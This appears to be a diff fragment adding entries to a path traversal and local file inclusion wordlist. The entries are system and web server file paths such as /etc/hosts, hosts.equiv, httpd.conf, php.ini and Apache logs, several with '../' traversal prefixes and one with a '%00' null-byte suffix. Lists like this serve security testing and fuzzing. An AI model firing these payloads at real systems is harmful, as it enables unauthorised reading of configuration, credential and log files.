+/etc/hostname.pcn3
+/etc/hostname.qfe0
+/etc/hostname.qfe1
+/etc/hostname.qfe2
+/etc/hostname.qfe3
+/etc/hostname.spwr0
+/etc/hostname.spwr1
+/etc/hostname.spwr2
+/etc/hostname.spwr3
+/etc/hosts
+../../../../../../../../../../../../etc/hosts
+../../../../../../../../../../../../etc/hosts%00
+/etc/hosts.allow
+/etc/hosts.deny
+/etc/hosts.equiv
+/etc/http/conf/httpd.conf
+/etc/httpd.conf
+/etc/httpd/conf.d/php.conf
+/etc/httpd/conf.d/squirrelmail.conf
+/etc/httpd/conf.d/ssl.conf
+/etc/httpd/conf/httpd.conf
+/etc/httpd/httpd.conf
+/etc/httpd/logs/acces_log
+/etc/httpd/logs/acces.log
+../../../../../../../etc/httpd/logs/acces_log
+../../../../../../../etc/httpd/logs/acces.log
+/etc/httpd/logs/access_log
+/etc/httpd/logs/access.log
+../../../../../etc/httpd/logs/access_log
+../../../../../etc/httpd/logs/access.log
+/etc/httpd/logs/error_log
+/etc/httpd/logs/error.log
+../../../../../../../etc/httpd/logs/error_log
+../../../../../../../etc/httpd/logs/error.log
+../../../../../etc/httpd/logs/error_log
+../../../../../etc/httpd/logs/error.log
+/etc/httpd/php.ini
+/etc/http/httpd.conf
+/etc/inetd.conf
+/etc/init.d/apache
+/etc/init.d/apache2
